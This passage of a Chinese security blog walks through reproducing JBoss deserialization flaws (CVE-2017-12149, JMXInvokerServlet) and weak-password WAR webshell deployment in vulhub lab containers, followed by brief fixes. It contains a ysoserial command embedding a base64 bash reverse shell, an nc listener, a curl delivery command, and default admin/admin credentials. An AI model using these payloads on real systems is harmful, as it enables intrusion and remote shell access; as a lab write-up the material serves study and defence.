<p>放入bash -c命令中，利用ysoserial自动反序列化</p>
<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508180820059.png" alt="image-20220508180820059"></p>
<p>生成poc.ser</p>
<p>开启nc监听<code>nc -lvnp 1234</code></p>
<p>利用curl发送poc.ser给目标接口，成功反弹shell   <code>curl http://192.168.52.128:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser </code></p>
<p>(如果没有反弹，试试换个ip，因为主机可能有多个网卡，不一定和容器在同一网络下)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508181255517.png" alt="image-20220508181255517"></p>
</li>
</ul>
</li>
</ul>
<h4 id="JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</h4><ul>
<li><p><strong>介绍</strong></p>
<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
</li>
<li><p><strong>复现</strong></p>
<p>vulhub开启容器</p>
<p>访问<code>invoker/readonly</code>界面，返回值500；漏洞存在</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508183218374.png" alt="image-20220508183218374"></p>
<p>和上面一样，可以直接利用上面的poc.ser，反弹shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508183423117.png" alt="image-20220508183423117"></p>
</li>
</ul>
<h4 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h4><ul>
<li><p><strong>介绍</strong></p>
<p>跟之前的CVE-2017-12149漏洞相似，都是使用了java的反序列化，该漏洞为 Java反序列化错误类型，存在于 Jboss 的  HttpInvoker 组件中的 ReadOnlyAccessFilter  过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet请求中读取了用户传入的对象，从而导致了漏洞</p>
</li>
<li><p><strong>复现</strong></p>
<p>vulhub直接搭建环境</p>
<p>漏洞点在<code>/invoker/JMXInvokerServlet</code>处</p>
<p>访问，回显下载，则漏洞存在</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508184112013.png" alt="image-20220508184112013"></p>
<p>同上直接curl访问，nc监听</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508184355167.png" alt="image-20220508184355167"></p>
</li>
<li><p><strong>反序列化漏洞修复</strong></p>
<ol>
<li><p>升级版本</p>
</li>
<li><p>临时解决方案：</p>
<ul>
<li><p>不需要 http-invoker.sar 组件的用户可直接删除此组件。</p>
</li>
<li><p>添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint  标签中：<url-pattern>&#x2F;*</url-pattern>用于对 http invoker 组件进行访问控制。</p>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="弱口令-amp-后台war部署"><a href="#弱口令-amp-后台war部署" class="headerlink" title="弱口令&amp;后台war部署"></a>弱口令&amp;后台war部署</h3><ul>
<li><p><strong>介绍</strong></p>
<ul>
<li><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下</p>
</li>
<li><p>登入后台界面可以爆破</p>
</li>
<li><p><strong>复现</strong></p>
<p>简单点，利用cve-2017-7504环境</p>
<p>访问<code>jmx-console</code>,和Tomcat一样是base64加密，可以直接爆破  </p>
<p>账户密码为 admin  admin</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225842050.png" alt="image-20220508225842050"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508220721260.png" alt="image-20220508220721260"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508220738292.png" alt="image-20220508220738292"></p>
<p>进入管理页面，访问<code>jboss.deployment</code>下的链接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508221657803.png" alt="image-20220508221657803"></p>
<p>找到addURL()函数，填入我们远程的war包(远程可以开启Nginx的环境，利用<code>docker cp 你的文件路径 容器长ID:docker容器路径</code>将war放入nginx访问目录下)，可以直接用Tomcat构造的war包，</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225121857.png" alt="image-20220508225121857"></p>
<p>回到后台界面，找到<code>Jboss.web.deplyment</code>,发现构造的war包(如果没有，多刷新几下)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225332955.png" alt="image-20220508225332955"></p>
<p>访问<code>/shell</code>目录存在shell.jsp；但访问不了，应该是有权限设置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225714577.png" alt="image-20220508225714577"></p>
</li>
</ul>
</li>
</ul>
<h2 id="WebLogic漏洞"><a href="#WebLogic漏洞" class="headerlink" title="WebLogic漏洞"></a>WebLogic漏洞</h2>

<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a>许可协议，转载请注明出处。</p>
</div></section></div>

</article>

<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2022/11/07/frp%E5%AD%A6%E4%B9%A0/">frp学习</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2022/11/05/test/">test</a></div></section></div>








      
<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 stday-K 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>

      <div class='float-panel mobile-only blur' style='display:none'>
  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
  </button>
</div>

    </div>
  </div>
  <div class='scripts'>
    <script type="text/javascript">
  stellar = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    loadCSS: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    // 从 butterfly 和 volantis 获得灵感
    loadScript: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    // https://github.com/jerryc127/hexo-theme-butterfly
    jQuery: (fn) => {
      if (typeof jQuery === 'undefined') {
        stellar.loadScript(stellar.plugins.jQuery).then(fn)
      } else {
        fn()
      }
    }
  };
  stellar.version = '1.14.0';
  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.14.0';
  stellar.config = {
    date_suffix: {
      just: '刚刚',
      min: '分钟前',
      hour: '小时前',
      day: '天前',
      month: '个月前',
    },
  };

  // required plugins (only load if needs)
  stellar.plugins = {
    jQuery: 'https://fastly.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js'
  };

  // stellar js
  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js"});

  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
  // optional plugins
  if ('true' == 'true') {
    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
  }
  if ('true' == 'true') {
    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
  }
  if ('' == 'true') {
    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://fastly.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
  }
  if ('true' == 'true') {
    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://fastly.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://fastly.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
  }
  if ('true' == 'true') {
    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
  }
  if ('false' == 'true') {
    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
  }
</script>

<!-- required -->

  
<script src="/js/main.js" async></script>



<!-- optional -->



<!-- inject -->


  </div>
</body>
</html>
